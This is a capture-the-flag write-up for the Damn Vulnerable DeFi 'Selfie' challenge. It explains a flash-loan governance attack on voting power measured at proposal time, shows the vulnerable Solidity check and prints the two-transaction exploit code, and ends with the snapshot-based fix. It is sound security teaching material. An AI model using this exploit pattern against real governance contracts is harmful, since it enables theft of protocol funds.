# Selfie (Damn Vulnerable DeFi #7)

**Vulnerability class:** Flash-loan governance attack — voting power measured by
instantaneous balance instead of a historical snapshot.

## The goal

Drain all 1,500,000 voting tokens from SelfiePool, which can only be emptied by
its `emergencyExit` function, callable exclusively by the SimpleGovernance contract.

## The flaw

SimpleGovernance decides who can queue an action with:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

Voting power is read at the instant of proposing, with no historical snapshot. The
same token the governance uses for voting is offered as a 0-fee flash loan by
SelfiePool. So an attacker can borrow more than half the supply for a single
transaction, gain majority voting power, and queue a malicious action.

A key detail: in ERC20Votes, holding tokens does not grant voting power until you
`delegate()`. So inside the flash loan the attacker must delegate to itself first,
then queue.

## The exploit

Two transactions, because governance enforces a 2-day delay between queue and execute:

```solidity
// TX1 - inside onFlashLoan (holding all tokens):
token.delegate(address(this));                        // activate voting power
bytes memory data = abi.encodeCall(SelfiePool.emergencyExit, (recovery));
actionId = governance.queueAction(address(pool), 0, data); // queue the drain
token.approve(address(pool), amount);                 // repay the loan

// ...wait 2 days...

// TX2:
governance.executeAction(actionId); // governance calls emergencyExit -> pool drained
```

The action stays queued even after the borrowed power is returned, because
governance only checks voting power at queue time, never at execution.

## The fix

Measure voting power from a historical snapshot (`getPastVotes` at the block the
proposal was created, or a checkpoint before it), so flash-loaned tokens grant no
usable voting power. Optionally require voting power to persist through execution.

## Lesson

Governance that reads instantaneous voting power is vulnerable to flash loans:
borrow the votes, queue a malicious action, return the loan. This is exactly the
Beanstalk hack (2022, ~$182M). Always snapshot voting power historically.
